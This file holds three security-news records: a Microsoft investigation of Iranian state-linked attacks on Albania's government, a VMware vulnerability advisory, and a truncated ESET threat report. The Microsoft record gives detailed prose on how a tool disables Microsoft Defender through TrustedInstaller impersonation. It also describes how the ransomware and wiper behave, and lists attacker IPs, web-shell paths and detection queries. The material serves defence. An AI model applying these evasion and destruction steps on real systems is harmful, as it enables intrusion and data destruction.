89af9415-1baf-5bb0-9466-ece2118bb908,08-September-2022,Microsoft investigates Iranian attacks against the Albanian government,Microsoft was engaged by the Albanian government to lead an investigation into cyberattacks against the government in mid-July. Microsoft assessed multiple Iranian actors participated in the attack. The company says the attacks were sponsored by the Iranian government. Microsoft's investigation found different actors responsible for different phases of the campaign.,"Shortly after the destructive cyberattacks against the Albanian government in mid-July, the Microsoft Detection and Response Team (DART) was engaged by the Albanian government to lead an investigation into the attacks. At the time of the attacks and our engagement by the Albanian government, Microsoft publicly stated that “Microsoft is committed to helping our customers be secure while achieving more. During this event, we quickly mobilized our Detection and Response Team (DART) to help the Albanian government rapidly recover from this cyber-attack. Microsoft will continue to partner with Albania to manage cybersecurity risks while continuing to enhance protections from malicious attackers.” This blog showcases the investigation, Microsoft’s process in attributing the related actors and the observed tactics and techniques observed by DART and the Microsoft Threat Intelligence Center (MSTIC) to help customers and the security ecosystem defend from similar attacks in the future. Microsoft assessed with high confidence that on July 15, 2022, actors sponsored by the Iranian government conducted a destructive cyberattack against the Albanian government, disrupting government websites and public services. At the same time, and in addition to the destructive cyberattack, MSTIC assesses that a separate Iranian state-sponsored actor leaked sensitive information that had been exfiltrated months earlier. Various websites and social media outlets were used to leak this information. There were multiple stages identified in this campaign: Initial intrusion Data exfiltration Data encryption and destruction Information operations Microsoft assessed with high confidence that multiple Iranian actors participated in this attack—with different actors responsible for distinct phases: DEV-0842 deployed the ransomware and wiper malware DEV-0861 gained initial access and exfiltrated data DEV-0166 exfiltrated data DEV-0133 probed victim infrastructure Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing MSTIC to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity. Once it meets the criteria, the DEV reference is converted to a named actor: Microsoft assessed with moderate confidence that the actors involved in gaining initial access and exfiltrating data in the attack are linked to EUROPIUM, which has been publicly linked to Iran’s Ministry of Intelligence and Security (MOIS) and was detected using three unique clusters of activity. We track them separately based on unique sets of tools and/or TTPs; however, some of them may work for the same unit. Information specific to Albania is shared with permission from the Albanian government. Figure 1. Threat actors behind the attack against the Albanian government Forensic analysis Evidence gathered during the forensic response indicated that Iran-affiliated actors conducted the attack. This evidence includes, but is not limited to: The attackers were observed operating out of Iran The attackers responsible for the intrusion and exfiltration of data used tools previously used by other known Iranian attackers The attackers responsible for the intrusion and exfiltration of data targeted other sectors and countries that are consistent with Iranian interests The wiper code was previously used by a known Iranian actor The ransomware was signed by the same digital certificate used to sign other tools used by Iranian actors Intrusion and exfiltration A group that we assess is affiliated with the Iranian government, DEV-0861, likely gained access to the network of an Albanian government victim in May 2021 by exploiting the CVE-2019-0604 vulnerability on an unpatched SharePoint Server, administrata.al (Collab-Web2. *.* ), and fortified access by July 2021 using a misconfigured service account that was a member of the local administrative group. Analysis of Exchange logs suggests that DEV-0861 later exfiltrated mail from the victim’s network between October 2021 and January 2022. DEV-0861 was observed operating from the following IPs to exfiltrate mail: 144[.]76[.]6[.]34 176[.]9[.]18[.]143 148[.]251[.]232[.]252 Analysis of the signals from these IPs, and other sources, indicated that DEV-0861 has been actively exfiltrating mail from different organizations in the following countries since April 2020: Figure 2. Timeline of data exfiltration activities by DEV-0861 The geographic profile of these victims—Israel, Jordan, Kuwait, Saudi Arabia, Turkey, and the UAE—aligns with Iranian interests and have historically been targeted by Iranian state actors, particularly MOIS-linked actors. DEV-0166 was observed exfiltrating mail from the victim between November 2021 and May 2022. DEV-0166 likely used the tool Jason.exe to access compromised mailboxes. A public analysis of Jason.exe can be found here . Note that this tool was reportedly used by actors affiliated with MOIS. Figure 3. Screenshot of the Jason.exe tool Ransomware and wiper The cyberattack on the Albanian government used a common tactic of Iranian state sponsored actors by deploying ransomware first , followed by deployment of the wiper malware. The wiper and ransomware both had forensic links to Iranian state and Iran-affiliated groups. The wiper that DEV-0842 deployed in this attack used the same license key and EldoS RawDisk driver as ZeroCleare, a wiper that Iranian state actors used in an attack on a Middle East energy company in mid-2019. In that case, IBM X-Force assessed that actors affiliated with EUROPIUM gained initial access nearly a year ahead of the wiper attack. The wiper attack was subsequently performed by a separate and unknown Iranian actor. This is similar to the chain of events Microsoft detected against the Albanian government. The code used in this attack had the following properties: Filename SHA-256 cl.exe e1204ebbd8f15dbf5f2e41dddc5337e3182fc4daf75b05acc948b8b965480ca0 rwdsk.sys 3c9dc8ada56adf9cebfc501a2d3946680dcb0534a137e2e27a7fcb5994cd9de6 Embedded in the cl.exe wiper was the hex-string ‘B4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47D,’ which was the same license key used for the EldoS RawDisk driver of the ZeroCleare wiper documented by IBM X-Force in 2019. The Eldos driver is a legitimate tool that was also abused by the ZeroCleare wiper and was used to delete files, disks, and partitions on the target systems. While ZeroCleare is not widely used, this tool is being shared amongst a smaller number of affiliated actors including actors in Iran with links to MOIS. The ransomware payload used in this attack by the DEV-0842 operator had the following properties: Filename SHA-256 GoXml.exe f116acc6508843f59e59fb5a8d643370dce82f492a217764521f46a856cc4cb5 This tool was signed with an invalid digital certificate from Kuwait Telecommunications Company KSC. This certificate had a SHA-1 thumbprint of 55d90ec44b97b64b6dd4e3aee4d1585d6b14b26f. Microsoft telemetry indicates this certificate was only used to sign 15 other files—a very small footprint, suggesting the certificate was not widely shared amongst unrelated actor groups. Multiple other binaries with this same digital certificate were previously seen on files with links to Iran, including a known DEV-0861 victim in Saudi Arabia in June 2021: Filename SHA-256 Read.exe ea7316bbb65d3ba4efc7f6b488e35db26d3107c917b665dc7a81e327470cb0c1 It’s not clear if Read.exe was dropped by DEV-0861 on this Saudi victim or if DEV-0861 also handed off access to the Saudi victim to DEV-0842. Additional indications of Iranian state sponsorship The messaging, timing, and target selection of the cyberattacks bolstered our confidence that the attackers were acting on behalf of the Iranian government. The messaging and target selection indicate Tehran likely used the attacks as retaliation for cyberattacks Iran perceives were carried out by Israel and the Mujahedin-e Khalq (MEK) , an Iranian dissident group largely based in Albania that seeks to overthrow the Islamic Republic of Iran. Messaging The attacker’s logo is an eagle preying on the symbol of the hacking group ‘Predatory Sparrow’ inside the Star of David (Figure 4). This signals the attack on Albania was retaliation for Predatory Sparrow’s operations against Iran , which Tehran perceives involved Israel. Predatory Sparrow has claimed responsibility for several high-profile and highly sophisticated cyberattacks against Iran state-linked entities since July 2021. This included a cyberattack that disrupted television programming of the Islamic Republic of Iran Broadcasting (IRIB) with images saluting MEK leaders in late January. Predatory Sparrow forewarned about the attack hours ahead of time and claimed they supported and paid for it, indicating others were involved. Iranian officials blamed this cyberattack on the MEK and additionally blamed the MEK and Israel for a cyberattack that used the same images and messaging against the Tehran municipality in June . The message in the ransom image indicates that the MEK, a long-standing adversary of the Iranian regime, was the primary target behind their attack on the Albanian government. The ransom image, like several posts by Homeland Justice, the group overtly pushing messages and leaking data linked to the attack, asked “why should our taxes be spent on terrorists of Durres.” This is a reference to the MEK, who Tehran considers terrorists , who have a large refugee camp in Durrës County in Albania. Figure 4. Ransomware image and Homeland Justice banner The messaging linked to the attack closely mirrored the messaging used in cyberattacks against Iran, a common tactic of Iranian foreign policy suggesting an intent to signal the attack as a form of retaliation. The level of detail mirrored in the messaging also reduces the likelihood that the attack was a false flag operation by a country other than Iran. The contact numbers listed in the ransom image (Figure 4), for example, were linked to multiple senior Albanian leaders, mirroring the cyberattacks on Iran’s railways and fueling pumps, which included a contact phone number belonging to the Iranian Supreme Leader’s Office . The messages in the information operations also emphasized targeting of corrupt government politicians and their support for terrorists and an interest in not harming the Albanian people (Figure 5). Similarly, the attack on Iranian steel companies claimed to target the steel factories for their connections to the Islamic Revolutionary Guard Corps (IRGC) while avoiding harm to Iranians. Another cyberattack on an Iranian airline in late 2021, which was claimed by Hooshyaran-e Vatan (meaning “Observants of the Fatherland” in Farsi), emphasized Tehran’s corruption and misappropriation of money on IRGC activities abroad. Figure 5. Message from Homeland Justice days after the cyberattack. Timing The cyberattack on July 15 occurred weeks after a string of cyberattacks on Iran , one week ahead of the MEK-sponsored Free Iran World Summit and aligned with other Iranian policy moves against the MEK, further bolstering the likelihood of Iranian involvement. On July 16, the day after the cyberattack, Iran’s Ministry of Foreign Affairs issued a statement designating current and former American politicians for supporting the MEK. The Free Iran World Summit, which the Iranian regime actively opposes, was canceled this year following warnings of possible terrorist threats to the Summit on July 21. A few days after the planned Free Iran World Summit, Iranian official press issued an editorial calling for military action against the MEK in Albania. This string of events suggests there may have been a whole-of-government Iranian effort to counter the MEK from Iran’s Ministry of Foreign Affairs, to intelligence agencies, to official press outlets. Target selection Some of the Albanian organizations targeted in the destructive attack were the equivalent organizations and government agencies in Iran that experienced prior cyberattacks with MEK-related messaging. This suggests the Iranian government chose those targets to signal the cyberattacks as a form of direct and proportional retaliation, a common tactic of the regime. Parallel information operations and amplification Before and after the Homeland Justice messaging campaign was launched, social media persona accounts and a group of real-life Iranian and Albanian nationals known for their pro-Iran, anti-MEK views, promoted the campaign’s general talking points and amplified the leaks published by the Homeland Justice accounts online. The parallel promotion of the Homeland Justice campaign and its central themes by these entities in the online space—before and after the cyberattack—suggests a broad-based information operation aimed at amplifying the impact of the attack. Ahead of the cyberattack, on June 6, Ebrahim Khodabandeh, a disaffected former MEK member posted an open letter addressed to Albanian Prime Minister Edi Rama warning of the consequences of escalating tensions with Iran. Invoking “[h]acking of Tehran municipal systems” and “ gas stations ,” Khodabandeh claimed that the MEK was the source of “sabotaging acts against the interests of the Iranian people [sic]” and argued that these constituted “the hostile work of your government” and has caused “obvious enmity with the Iranian nation [sic].” Four days later, on June 10, Khodabandeh and the Nejat Society, an anti-MEK NGO that he heads, hosted a group of Albanian nationals in Iran. The group included members of another anti-MEK organization called the Association for the Support of Iranians Living in Albania (ASILA)—Gjergji Thanasi, Dashamir Mersuli, and Vladimir Veis. Given the highly political nature of ASILA’s work on issues related to a group that Tehran considers a terrorist organization (the MEK), it is highly possible that this visit was conducted with sanction from the state. Upon their return from Iran, on July 12, Nejat Society said Albanian police raided their offices and detained some ASILA members. While Nejat Society said this raid was a result of “false and baseless accusations,” according to local media the raid stemmed from possible connections to Iranian intelligence services. Figure 6. ASILA members in Iran in June 2022. Pictured, from left, are Gjergji Thanasi, Ebrahim Khodabandeh, Dashamir Mersuli, and Vladimir Veis. In the wake of the cyberattack, on July 23, Thanasi and Olsi Jazexhi, another Albanian national who frequently appears on Iran’s state-sponsored media outlet PressTV espousing anti-MEK positions, penned a second open letter addressed to then-Albanian President Ilir Meta, also published on Nejat Society’s website. This letter echoed Homeland Justice’s central claim—namely that Albania’s continuing to host the MEK constituted a danger to the Albanian people. Jazexhi and Thanasi called on Meta to convene Albania’s National Security Council to “consider whether Albania has entered into a cyber and military conflict with the Islamic Republic of Iran.” In May 2021, at around the same time that Iranian actors began their intrusion into Albanian government victim systems, accounts for two anti-MEK social media personas , which do not appear to correspond to real people, were created on both Facebook and Twitter. The accounts largely post anti-MEK content and engage with the social media accounts of some of the individuals detailed above. These two accounts along with a third, older account, were among the first to promote posts from Homeland Justice accounts on Twitter, and all three dramatically increased the rate of anti-MEK posts after the mid-July 2022 cyberattack became public. There exists some additional evidence that the role of these personas extended beyond mere social media amplification and into content production. One of the personas which repeatedly posted Homeland Justice content had previously written for the now-defunct IRGC-linked American Herald Tribune and other fringe news sites, often in negative terms about the MEK. A second persona account, meanwhile, may have attempted to contact at least one Albanian newspaper ahead of the hack-and-leak, requesting “cooperation”, and the ability to publish with the outlet. The parallel promotion of the Homeland Justice campaign and its central themes by these individuals and personas online both before and after the cyberattack adds a compelling human dimension to the broader Homeland Justice influence effort. While there were no observed direct relationships between the threat actors responsible for the destructive attack and these messaging actors, their actions raise questions worthy of further examination. Observed actor activity DART and MSTIC supported the post ransom and wiper attack analysis leveraging Microsoft 365 Defender and collection of additional forensic artifacts. Analysis identified the use of vulnerabilities to implant web shells for persistence, reconnaissance actions, common credential harvesting techniques, defense evasion methods to disable security products, and a final attempt of actions on objective deploying encryption and wiping binaries. The Iranian sponsored attempt at destruction had less than a 10% total impact on the customer environment. Access and implant Based on investigative analysis, starting in May 2021, actors exploited vulnerabilities of a public-facing endpoint to execute arbitrary code that implanted web shells on the unpatched SharePoint server (Collab-Web2.*.*), as stated previously. These generic web shells provided the ability to upload files, download files, delete files, rename, execute commands with an option to run as specific user. Figure 7. The web shell console from the attacker’s point of view Web shells were placed in the following directories: C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\evaluatesiteupgrade.cs.aspx C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\Pickers.aspx C:\ProgramData\COM1\frontend\Error4.aspx Lateral movement and execution Following initial access and implant, the threat actor was observed using Mimikatz for credential harvesting and a combination of Impacket and Remote Desktop Clients for lateral movement efforts using the built-in administrator account. Unrecoverable tooling was identified, which highly suggests that reconnaissance efforts were present in the form of file names of executables, resident mailbox data, database, and user details. Similar actions by the threat actors observed by MSTIC and DART detail both custom and open-source tooling utilized for these efforts. Artifacts of tooling identified: IPGeter.exe FindUser.exe recdisc.exe NetE.exe advanced_port_scanner.exe mimikatz.exe shared.exe Stored CSV and TXT files Data collection During the period of October 2021 – January 2022, the threat actors used a unique email exfiltration tool which interacted with the Exchange web services APIs to collect email in a manner that masked the actions. The threat actors accomplished these actions by creating an identity named “HealthMailbox55x2yq” to mimic a Microsoft Exchange Health Manager Service account using Exchange PowerShell commands on the Exchange Servers. The threat actors then added the account to the highly privileged exchange built-in role group “Organization Management” to later add the role of “Application Impersonation”. The ApplicationImpersonation management role enables applications to impersonate users in an organization to perform tasks on behalf of the user, providing the ability for the application to act as the owner of a mailbox. Defense evasion Prior to launching the final stage of the attack, the threat actors gained administrative access to a deployed endpoint detection and response (EDR) solution to make modifications, removing libraries that affected the agents across the enterprise. In addition, a binary to disable components of Microsoft Defender Antivirus was propagated using custom tooling. The distributed binary named disable-defender.exe queries for TokenElevation using the GetTokenInformation API and checks if the process is running with elevated privileges. If the token is not running with elevated privilege, the binary prints “Must run as admin!\n”. If the token is elevated, it queries TokenUser and checks if the SID is “S-1-5-18”. If the current process doesn’t run under system context, it prints “Restarting with privileges\n” and attempts to elevate the privilege. To elevate the privilege, the binary checks if the TrustedInstaller service is enabled. To do this, it starts the service “SeDebugPrivilege” and “SeImpersonatePrivilege” to assign privileges to itself. It then looks for winlogon.exe process, acquires its token, and impersonates calling thread using ImpersonateLoggedOnUser/SetThreadToken. After impersonating as winlogon.exe , it opens TrustedInstaller process, acquires its token for impersonation and creates a new process with elevated privileges using CreateProcessWithTokenW. Figure 8. How the attacker is able to evade defense components Once it successfully creates its own process with TrustedInstaller privilege, it proceeds to disable Defender components. Terminates smartscreen.exe Modifies WinDefend service to DemandLoad. Modifies “TamperProtection” value to 0 Queries WMI “Root\Microsoft\Windows\Defender” Namespace “MSFT_MpPreference” class for “DisableRealtimeMonitoring” Sets “DisableAntiSpyware” value to 1 Sets “SecurityHealth” value to 3 Sets “DisableAntiSpyware” value to 0 Sets “SYSTEM\CurrentControlSet\Services\WinDefend” service “Start” value to 3 Sets “DisableRealtimeMonitoring” value to 1 Modifies further settings using WMI “Root\Microsoft\Windows\Defender” Namespace “MSFT_MpPreference” class values, “EnableControlledFolderAccess” “PUAProtection” “DisableRealtimeMonitoring” “DisableBehaviorMonitoring” “DisableBlockAtFirstSeen” “DisablePrivacyMode” “SignatureDisableUpdateOnStartupWithoutEngine” “DisableArchiveScanning” “DisableIntrusionPreventionSystem” “DisableScriptScanning” “DisableAntiSpyware” “DisableAntiVirus” “SubmitSamplesConsent” “MAPSReporting” “HighThreatDefaultAction” “ModerateThreatDefaultAction” “LowThreatDefaultAction” “SevereThreatDefaultAction” “ScanScheduleDay” Additional evasion techniques included the deletion of tooling, Windows events, and application logs. Actions on objective Distribution of the encryption and wiping binaries was accomplished with two methods via a custom SMB remote file copy tool Mellona.exe , originally named MassExecuter.exe . The first method remote file copied the ransom binary GoXml.exe and a bat file that triggers the execution of the ransom or wiper on a user login. The second method was by remotely invoking the ransom binary with the Mellona.exe tool, post SMB remote file copy. Figure 9. Process Command lines for Mellona.exe used to distribute malware win.bat – Batch file for ransom execution – Trojan:Win32/BatRunGoXml Executes the ransom binary from the All Users starts up folder and will be executed on the trigger of a user login. Figure 10. Win.bat contents GoXml.exe – ransomware binary – Ransom:Win32/Eagle!MSR Takes >= 5 arguments, and the arguments can be anything, as it looks for argument count only. If the number of the command line arguments is less than 5, it will error and create an Open dialog box via GetOpenFileNameA that lets the user open a *.xml file If 5 or more command line arguments were provided, it will firstly check the running instances by opening the Mutex below via OpenMutexA: “Global\\abcdefghijklmnoklmnopqrstuvwxyz01234567890abcdefghijklmnopqrstuvwxyz01234567890” If there are no other running instances, it will create the Mutex above via CreateMutexA. Attempts to mount all the volumes: Finds available volumes via FindFirstVolumeW and FindNextVolumeW. Retrieves the mounted folders of the volume via GetVolumePathNamesForVolumeNameW. If there is no mounted point for the volume, creates a new directory named c:\\HD%c (%c is A, B, C, …) via CreateDirectoryW. Mounts the volume to the newly create directory via SetVolumeMountPointW. Launches cmd.exe and runs the following batch script through anonymous pipe: Figure 11. Batch script content of the ransomware Strings are encrypted with RC4 Algorithm with key “8ce4b16b22b58894aa86c421e8759df3”. Generates Key using rand() function and uses that to derive RC4 key to encrypt files. The derived key is then encrypted with Public key hardcoded in the file. This encrypted key is then encoded with customized Base64 characters and appended to the ransom note. Renames the file as [original file name].lck , and then encrypts the renamed file. Drops a ransom notes file named How_To_Unlock_MyFiles.txt in each folder before encrypting the files, the ransom notes are written in Albanian. Figure 12. Ransom note written in Albanian Performs a self-delete by launching cmd.exe and executes a batch script though anonymous pipe to perform deletion. Figure 13. Batch script for deletion cl.exe – wiper – Dos:Win64/WprJooblash cl.exe takes the following parameters cl.exe in – Installs the driver rwdsk.sys and its service cl.exe un – Uninstalls the driver rwdsk.sys and its service cl.exe wp <PATH> – Wipes the give path leveraging rwdsk.sys driver Figure 14. The malware using rwdsk.sys Service created: HKLM\SYSTEM\CurrentControlSet\Services\RawDisk3 Installed driver should be located in C:\Windows\System32\drivers\rwdsk.sys or the same directory cl.exe is staged. Figure 15. Directory where the driver is installed By providing path (Example: \??\PHYSICALDRIVE0) with the ‘wp’ parameter, passes it to the below function including GENERIC_READ | GENERIC_WRITE access value and a hexadecimal value “B4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47D”. Based on the reference below, the same hex value is used in ZeroCleare Wiper in 2020. IBM confirms this value is the license key for RawDisk Figure 16. Hex value used in ZeroCleare Wiper Recommended customer actions The techniques used by the actor and described in the Observed actor activity section can be mitigated by adopting the security considerations provided below: Use the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion Block inbound traffic from IPs specified in the Indicators of compromise table Review all authentication activity for remote access infrastructure, with a particular focus on accounts configured with single factor authentication, to confirm authenticity and investigate any anomalous activity Enable multifactor authentication (MFA) to mitigate potentially compromised credentials and ensure that MFA is enforced for all remote connectivity NOTE: Microsoft strongly encourages all customers download and use password-less solutions like Microsoft Authenticator to secure your accounts Enable Microsoft Defender Antivirus tamper protection to prevent unwanted malicious apps disabling components of Microsoft Defender Antivirus Understand and assess your cyber exposure with advanced vulnerability and configuration assessment tools Indicators of compromise (IOCs) The table below shows IOCs observed during our investigation. We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems. Indicator Type Description GoXml.exe SHA-256 f116acc6508843f59e59fb5a8d643370dce82f492a217764521f46a856cc4cb5 “w.zip”, “cl.exe” “cls5.exe” SHA-256 e1204ebbd8f15dbf5f2e41dddc5337e3182fc4daf75b05acc948b8b965480ca0 Win.bat SHA-256 bad65769c0b416bb16a82b5be11f1d4788239f8b2ba77ae57948b53a69e230a6 ADExplorer.exe SHA-256 bb45d8ffe245c361c04cca44d0df6e6bd7596cabd70070ffe0d9f519e3b620ea Ldd.2.exe SHA-256 e67c7dbd51ba94ac4549cc9bcaabb97276e55aa20be9fae909f947b5b7691e6b Mellona.exe SHA-256 ac4809764857a44b269b549f82d8d04c1294c420baa6b53e2f6b6cb4a3f7e9bd Sl.exe SHA-256 d1bec48c2a6a014d3708d210d48b68c545ac086f103016a20e862ac4a189279e HxD.exe (Hex Editor) SHA-256 d145058398705d8e20468332162964dce5d9e2ad419f03b61adf64c7e6d26de5 Lsdsk.exe SHA-256 1c926d4bf1a99b59391649f56abf9cd59548f5fcf6a0d923188e7e3cab1c95d0 NTDSAudit.exe SHA-256 fb49dce92f9a028a1da3045f705a574f3c1997fe947e2c69699b17f07e5a552b Disable-defender.exe SHA-256 45bf0057b3121c6e444b316afafdd802d16083282d1cbfde3cdbf2a9d0915ace Rognar.exe SHA-256 dfd631e4d1f94f7573861cf438f5a33fe8633238d8d51759d88658e4fbac160a Ipgeter.exe SHA-256 734b4c06a283982c6c3d2952df53e0b21e55f3805e55a6ace8379119d7ec1b1d evaluatesiteupgrade.aspx SHA-256 f8db380cc495e98c38a9fb505acba6574cbb18cfe5d7a2bb6807ad1633bf2df8 Pickers.aspx SHA-256 0b647d07bba697644e8a00cdcc8668bb83da656f3dee10c852eb11effe414a7e ClientBin.aspx SHA-256 7AD64B64E0A4E510BE42BA631868BBDA8779139DC0DAAD9395AB048306CC83C5 App_Web_bckwssht.dll SHA-256 CAD2BC224108142B5AA19D787C19DF236B0D12C779273D05F9B0298A63DC1FE5 C:\Users\<User name>\Desktop\ Staging directory C:\ProgramData\ Staging directory C:\Users\<User name>\Desktop\a Staging directory C:\ProgramData\1\ Staging directory C:\ProgramData\2\ Staging directory 144[.]76[.]6[.]34 IP address Accessed web shell 148[.]251[.]232[.]252 IP address Accessed web shell 148[.]251[.]233[.]231 IP address Accessed web shell 176[.]9[.]18[.]143 IP address Accessed web shell 185[.]82[.]72[.]111 IP address Accessed web shell 216[.]24[.]219[.]65 IP address Accessed web shell 216[.]24[.]219[.]64 IP address Accessed web shell 46[.]30[.]189[.]66 IP address Accessed web shell NOTE: These indicators should not be considered exhaustive for this observed activity. Microsoft Defender Threat Intelligence Community members and customers can find summary information and all IOCs from this blog post in the linked Microsoft Defender Threat Intelligence article . Detections Microsoft 365 Defender Microsoft Defender Antivirus TrojanDropper:ASP/WebShell!MSR (web shell) Trojan:Win32/BatRunGoXml (malicious BAT file) DoS:Win64/WprJooblash (wiper) Ransom:Win32/Eagle!MSR (ransomware) Trojan:Win32/Debitom.A ( disable-defender.exe ) Microsoft Defender for Endpoint EDR Microsoft Defender for Endpoint customers should watch for these alerts that can detect behavior observed in this campaign. Note however that these alerts are not indicative of threats unique to the campaign or actor groups described in this report. Suspicious behavior by Web server process Mimikatz credential theft tool Ongoing hands-on-keyboard attack via Impacket toolkit Suspicious RDP connection observed Addition to Exchange Organization Management role group TrustedInstaller hijack attempt Microsoft Defender Antivirus tampering Process removed a security product Tamper protection bypass Suspicious file in startup folder Ransomware behavior detected in the file system Ransomware behavior by remote device Emerging threat activity group Microsoft Defender Vulnerability Management Microsoft Defender Vulnerability Management surfaces impacted devices that may be affected by the Exchange (ProxyLogon) and SharePoint vulnerabilities used in the attack: CVE-2019-0604 CVE-2021-26855 Advanced hunting queries Microsoft Sentinel To locate possible threat actor activity mentioned in this blog post, Microsoft Sentinel customers can use the queries detailed below: Identify threat actor IOCs This query identifies a match based on IOCs related to EUROPIUM across various Microsoft Sentinel data feeds: https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/EUROPIUM _September2022.yaml Identify Microsoft Defender Antivirus detection related to EUROPIUM This query looks for Microsoft Defender AV detections related to EUROPIUM actor and joins the alert with other data sources to surface additional information such as device, IP, signed-in users, etc. https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityAlert/EuropiumAVHits.yaml Identify creation of unusual identity The query below identifies creation of unusual identity by the Europium actor to mimic Microsoft Exchange Health Manager Service account using Exchange PowerShell commands. https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/EuropiumUnusualIdentity.yaml Microsoft 365 Defender To locate possible threat actor activity mentioned in this blog post, Microsoft 365 Defender customers can use the queries detailed below: Identify EUROPIUM IOCs The following query can locate activity possibly associated with the EUROPIUM threat actor. Github link DeviceFileEvents | where SHA256 in (""f116acc6508843f59e59fb5a8d643370dce82f492a217764521f46a856cc4cb5"",""e1204ebbd8f15dbf5f2e41dddc5337e3182fc4daf75b05acc948b8b965480ca0"",""bad65769c0b416bb16a82b5be11f1d4788239f8b2ba77ae57948b53a69e230a6"",""bb45d8ffe245c361c04cca44d0df6e6bd7596cabd70070ffe0d9f519e3b620ea"",""d1bec48c2a6a014d3708d210d48b68c545ac086f103016a20e862ac4a189279e"",""fb49dce92f9a028a1da3045f705a574f3c1997fe947e2c69699b17f07e5a552b"",""45bf0057b3121c6e444b316afafdd802d16083282d1cbfde3cdbf2a9d0915ace"",""f8db380cc495e98c38a9fb505acba6574cbb18cfe5d7a2bb6807ad1633bf2df8"",""7ad64b64e0a4e510be42ba631868bbda8779139dc0daad9395ab048306cc83c5"",""cad2bc224108142b5aa19d787c19df236b0d12c779273d05f9b0298a63dc1fe5"",""84be43f5830707cd421979f6775e9edde242bab98003644b3b491dbc08cc7c3e"") Identify Microsoft Defender Antivirus detection related to EUROPIUM This query looks for Microsoft Defender Antivirus detections related to EUROPIUM actor. Github link let europium_sigs = dynamic([""BatRunGoXml"", ""WprJooblash"", ""Win32/Eagle!MSR"", ""Win32/Debitom.A""]); AlertEvidence | where ThreatFamily in~ (europium_sigs) | join AlertInfo on AlertId | project ThreatFamily, AlertId Identify unusual identity additions related to EUROPIUM This query looks for identity additions through exchange PowerShell. Github link DeviceProcessEvents | where ProcessCommandLine has_any (""New-Mailbox"",""Update-RoleGroupMember"") and ProcessCommandLine has ""HealthMailbox55x2yq"""
59cb5aec-68b7-5bc6-af9d-c203b0d2cede,03-August-2022,CVE-2022-31656 – Critical VMware Vulnerability,"VMware has disclosed a new critical vulnerability impacting multiple products. The vulnerability is an authentication bypass vulnerability. the vulnerability impacts Workspace ONE Access, Identity Manager, and vRealize Automation. Proof-of-Concept exploit code is expected to be released soon.","On August 2 nd , 2022, VMware disclosed a new critical vulnerability impacting multiple VMware products. The vulnerability, tracked as CVE-2022-31656 (CVSS: 9.8) is an authentication bypass vulnerability. A threat actor with previous network access may exploit CVE-2022-31656 in order to obtain administrative access without the need to authenticate. The vulnerability impacts VMware Workspace ONE Access, Identity Manager, and vRealize Automation. Exploitation of the CVE-2022-31656 has not been identified at this time. Proof-of-Concept (PoC) exploit code is expected to be released in the near future. The eSentire Threat Intelligence team asses with high confidence that the release of PoC code will result in real- world attacks. CVE-2022-31656 is believed to be a patch bypass or variant of a previous easily exploitable authentication bypass vulnerability tracked as CVE-2022-22972 . The researcher that discovered and reported CVE-2022-31656 to VMware has publicly stated that functional PoC exploit code and a technical write up on the vulnerability will be released soon. The availability of both PoC code and technical details significantly increases the likelihood of exploitation by threat actors in the wild. In total, VMware addressed ten separate vulnerabilities in this disclosure. Other vulnerability types from the release include Remote Code Execution (RCE), Privilege Escalation, URL Injection, Path Traversal, and Cross-Site Scripting. CVE-2022-31656 is the most critical vulnerability from the release, but all vulnerabilities should be patched as soon as possible. Impacted VMware Products: [1] https://www.vmware.com/security/advisories/VMSA-2022-0021.html [2] https://kb.vmware.com/s/article/89084 [3] https://twitter.com/VietPetrus/status/1554485970514608128 [4] https://www.vmware.com/security/advisories/VMSA-2022-0014.html"
89ee3c9a-2adc-5467-9fd8-9d97eac7b4da,05-October-2022,ESET Threat Report T2 2022,"ESET says August was a vacation month for operators of Emotet, the most influential downloader strain. Remote Desktop Protocol attacks continued to decline in T2 2022. The company says the decline is due to the Russia-Ukraine war and other factors.","A view of the T2 2022 threat landscape as seen by ESET telemetry and from the perspective of ESET threat detection and research experts The past four months were the time of summer vacations for many of us in the northern hemisphere. It appears that some malware operators also took this time as an opportunity to possibly rest, refocus, and reanalyze their current procedures and activities. According to our telemetry, August was a vacation month for the operators of Emotet , the most influential downloader strain. The gang behind it also adapted to Microsoft’s decision to disable VBA macros in documents originating from the internet and focused on campaigns based on weaponized Microsoft Office files and LNK files. In T2 2022, we saw the continuation of the sharp decline of Remote Desktop Protocol (RDP) attacks, which likely continued to lose their steam due to the Russia-Ukraine war, along with the post-COVID return to offices and overall improved security of corporate environments. Even with declining numbers, Russian IP addresses continued to be responsible for the largest portion of RDP attacks. In T1 2022, Russia was also the country that was most targeted by ransomware, with some of the attacks being politically or ideologically motivated by the war. However, as you will read in the ESET Threat Report T2 2022, this hacktivism wave has declined in T2, and ransomware operators turned their attention towards the United States, China, and Israel. In terms of threats mostly impacting home users, we saw a sixfold increase in detections of shipping-themed phishing lures, most of the time presenting the victims with fake DHL and USPS requests to verify shipping addresses. A web skimmer known as Magecart, which saw a threefold increase in T1 2022, continued to be the leading threat going after online shoppers’ credit card details. The plummeting cryptocurrency exchange rates also affected online threats – criminals turned to stealing cryptocurrencies instead of mining them, as seen in a twofold increase in cryptocurrency-themed phishing lures and rising numbers of cryptostealers. The past four months were also interesting in research terms. Our researchers uncovered a previously unknown macOS backdoor and later attributed it to ScarCruft, discovered an updated version of the Sandworm APT group’s ArguePatch malware loader , uncovered Lazarus payloads in trojanized apps , and analyzed an instance of the Lazarus Operation In(ter)ception campaign targeting macOS devices while spearphishing in crypto-waters. They also discovered buffer overflow vulnerabilities in Lenovo UEFI firmware and a new campaign using a fake Salesforce update as a lure. During the past few months, we have continued to share our knowledge at the Virus Bulletin, Black Hat USA, RSA, CODE BLUE, SecTor, REcon, LABSCon, and BSides Montreal cybersecurity conferences, where we disclosed our findings about campaigns deployed by OilRig, APT35, Agrius, Sandworm, Lazarus, and POLONIUM. We also 